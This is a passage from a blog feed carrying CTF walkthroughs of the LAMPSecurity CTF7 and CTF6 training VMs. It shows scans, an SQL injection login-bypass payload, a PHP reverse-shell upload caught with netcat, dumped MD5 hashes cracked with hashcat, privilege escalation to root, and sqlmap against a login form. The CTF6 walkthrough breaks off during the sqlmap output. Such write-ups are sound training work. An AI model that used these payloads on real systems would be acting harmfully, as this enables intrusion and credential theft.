      &lt;li&gt;&lt;a href=&quot;#php-shell-upload&quot; id=&quot;markdown-toc-php-shell-upload&quot;&gt;PHP Shell Upload&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#dirbuster&quot; id=&quot;markdown-toc-dirbuster&quot;&gt;Dirbuster&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#reverse-shell&quot; id=&quot;markdown-toc-reverse-shell&quot;&gt;Reverse Shell&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-enumeration&quot; id=&quot;markdown-toc-local-enumeration&quot;&gt;Local Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#mysql&quot; id=&quot;markdown-toc-mysql&quot;&gt;MySQL&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#hashcat-md5-cracking&quot; id=&quot;markdown-toc-hashcat-md5-cracking&quot;&gt;Hashcat md5 cracking&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#cracked-md5-hashes&quot; id=&quot;markdown-toc-cracked-md5-hashes&quot;&gt;Cracked MD5 Hashes&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The LAMPSecurity project is an effort to produce training and benchmarking
tools that can be used to educate information security professionals and test
products.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; madirish2600&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.30.134&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;Dislcaimer: Multiple Entry Points&lt;/h5&gt;
  &lt;p&gt;The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the &lt;b&gt;web application&lt;/b&gt; as the entry point.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 5.3 (protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.15 ((CentOS))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 139&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;Samba&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Samba smbd 3.X (workgroup: MYGROUP)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 901&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Samba SWAT administration server&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 8080&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.15 ((CentOS))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 10000&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;Webmin&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;(Webmin httpd)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

     &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;web-application-enumeration&quot;&gt;Web Application Enumeration&lt;/h2&gt;

&lt;p&gt;Host enumeration discovered two web application, one on port &lt;code&gt;80&lt;/code&gt; and one on port
&lt;code&gt;8080&lt;/code&gt;, as with the previous CTF series VM’s, other entry points are
ignored and the &lt;strong&gt;web application&lt;/strong&gt; is used for the entry point.&lt;/p&gt;

&lt;h2 id=&quot;web-application-on-port-8080&quot;&gt;Web Application on Port 8080&lt;/h2&gt;

&lt;p&gt;Inspection of the web application revealed it’s vulnerable to an SQLi
authentication bypass. By Entering &lt;code&gt;' or 1=1 -- .&lt;/code&gt; in the username
field an attacker can successfully login as admin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf7/sqli.png&quot; alt=&quot;SQL Injection Auth Bypass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Admin account:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf7/admin-login.png&quot; alt=&quot;Admin Account SQLi&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;php-shell-upload&quot;&gt;PHP Shell Upload&lt;/h3&gt;

&lt;p&gt;With admin access to the web application it was possible to upload a reverse
shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf7/upload-shell.png&quot; alt=&quot;Reverse PHP Shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Execution of the php shell was not possible via the web application directly.&lt;/p&gt;

&lt;h3 id=&quot;dirbuster&quot;&gt;Dirbuster&lt;/h3&gt;

&lt;p&gt;Dirbuster disclosed the location of the file uploads directory
&lt;code&gt;/assets/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf7/dirbuster.png&quot; alt=&quot;OWASP Dirbuster&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf7/exec-webshell.png&quot; alt=&quot;Execute Reverse Shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Executing the php script resulted in a reverse shell as the user apache:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# nc &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.134] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.133] 58599
Linux localhost.localdomain 2.6.32-279.el6.i686 &lt;span class=&quot;c&quot;&gt;#1 SMP Fri Jun 22 10:59:55 UTC&lt;/span&gt;
2012 i686 i686 i386 GNU/Linux
01:12:47 up  2:37,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;apache&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;apache&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;48&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;apache&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;system_u:system_r:httpd_t:s0
sh: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
sh-4.1&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;

&lt;p&gt;Local enumeration discovered mysql root account could be accessed locally
without a password:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root  and no password worked as the apache user.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;mysql&quot;&gt;MySQL&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mysql&amp;gt; &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;username, password from &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;username, password from &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
| username
| password                         |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
| brian@localhost.localdomain
| 4cb9c8a8048fd02294477fcb1a41191a |
| john@localhost.localdomain
| 0d9ff2a4396d6939f80ffe09b1280ee1 |
| alice@localhost.localdomain
| 2146bf95e8929874fc63d54f50f1d2e3 |
| ruby@localhost.localdomain
| 9f80ec37f8313728ef3e2f218c79aa23 |
| leon@localhost.localdomain
| 5d93ceb70e2bf5daa84ec3d0cd2c731a |
| julia@localhost.localdomain
| ed2539fe892d2c52c42a440354e8e3d5 |
| michael@localhost.localdomain
| 9c42a1346e333a770904b2a2b37fa7d3 |
| bruce@localhost.localdomain
| 3a24d81c2b9d0d9aaf2f10c6c9757d4e |
| neil@localhost.localdomain
| 4773408d5358875b3764db552a29ca61 |&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;hashcat-md5-cracking&quot;&gt;Hashcat md5 cracking&lt;/h3&gt;

&lt;p&gt;The hashes were placed in a text file using the following format:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;brian@localhost.localdomain:4cb9c8a8048fd02294477fcb1a41191a
john@localhost.localdomain:0d9ff2a4396d6939f80ffe09b1280ee1
alice@localhost.localdomain:2146bf95e8929874fc63d54f50f1d2e3
ruby@localhost.localdomain:9f80ec37f8313728ef3e2f218c79aa23
leon@localhost.localdomain:5d93ceb70e2bf5daa84ec3d0cd2c731a
julia@localhost.localdomain:ed2539fe892d2c52c42a440354e8e3d5
michael@localhost.localdomai:9c42a1346e333a770904b2a2b37fa7d3
bruce@localhost.localdomai:3a24d81c2b9d0d9aaf2f10c6c9757d4e
neil@localhost.localdomain:4773408d5358875b3764db552a29ca61
charles@localhost.localdomai:b2a97bcecbd9336b98d59d9324dae5cf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;NOTE: In order for hashcat to ignore usernames in a hash input file you need to
specify &lt;code&gt;--username &lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# hashcat &lt;span class=&quot;nt&quot;&gt;--username&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 crack-ctf7.txt
/usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;cracked-md5-hashes&quot;&gt;Cracked MD5 Hashes&lt;/h4&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ed2539fe892d2c52c42a440354e8e3d5:madrid
4cb9c8a8048fd02294477fcb1a41191a:changeme
5d93ceb70e2bf5daa84ec3d0cd2c731a:qwer1234
2146bf95e8929874fc63d54f50f1d2e3:turtles77
9c42a1346e333a770904b2a2b37fa7d3:somepassword
b2a97bcecbd9336b98d59d9324dae5cf:chuck33&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h2&gt;

&lt;p&gt;The julia account was able to &lt;code&gt;su&lt;/code&gt; to root.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su - julia
su - julia
Password: madrid

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;julia@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;julia: madrid

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost julia]# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;system_u:system_r:httpd_t:s0
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost julia]#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>LAMP Security CTF6 - Walkthrough</title>
          <link>https://highon.coffee/blog/lamp-security-ctf6-walkthrough/</link>
          <pubDate>Tue, 04 Mar 2014 19:40:59 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/lamp-security-ctf6-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#host-service-enumeration&quot; id=&quot;markdown-toc-host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-enumeration&quot; id=&quot;markdown-toc-web-application-enumeration&quot;&gt;Web Application Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sqlmap---sql-injection&quot; id=&quot;markdown-toc-sqlmap---sql-injection&quot;&gt;SQLMap - SQL Injection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-exploitation&quot; id=&quot;markdown-toc-web-application-exploitation&quot;&gt;Web Application Exploitation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The LAMPSecurity project is an effort to produce training and benchmarking
tools that can be used to educate information security professionals and test
products.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; madirish2600&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;Dislcaimer: Multiple Entry Points&lt;/h5&gt;
  &lt;p&gt;The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the &lt;b&gt;web application&lt;/b&gt; as the entry point.&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;h3 id=&quot;host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.30.131&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 4.3 (protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.3 ((CentOS))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 110&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;pop3&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Dovecot pop3d&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 111&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;rpcbind&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;N/A&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 143&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;IMAP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Dovecot imapd&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 443&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTPS&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.3 ((CentOS))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 621&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;RPC&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;N/A&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 993&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;IMAP SSL&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Dovecot imapd&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 995&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;POP3 SSL&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Dovecot pop3d&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP:3306 &lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;MySQL&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;MySQL 5.0.45&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;web-application-enumeration&quot;&gt;Web Application Enumeration&lt;/h2&gt;

&lt;p&gt;Inspection of the Web Application indicated it was vulnerable to SQL injection.&lt;/p&gt;

&lt;h2 id=&quot;sqlmap---sql-injection&quot;&gt;SQLMap - SQL Injection&lt;/h2&gt;

&lt;p&gt;SQLMap confirmed SQL injection was possible.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; root:~]# sqlmap &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.221.131/?action=login&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--forms&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--dbs&lt;/span&gt;

available databases &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;5]:
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; cms
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; information_schema
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; mysql
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; roundcube
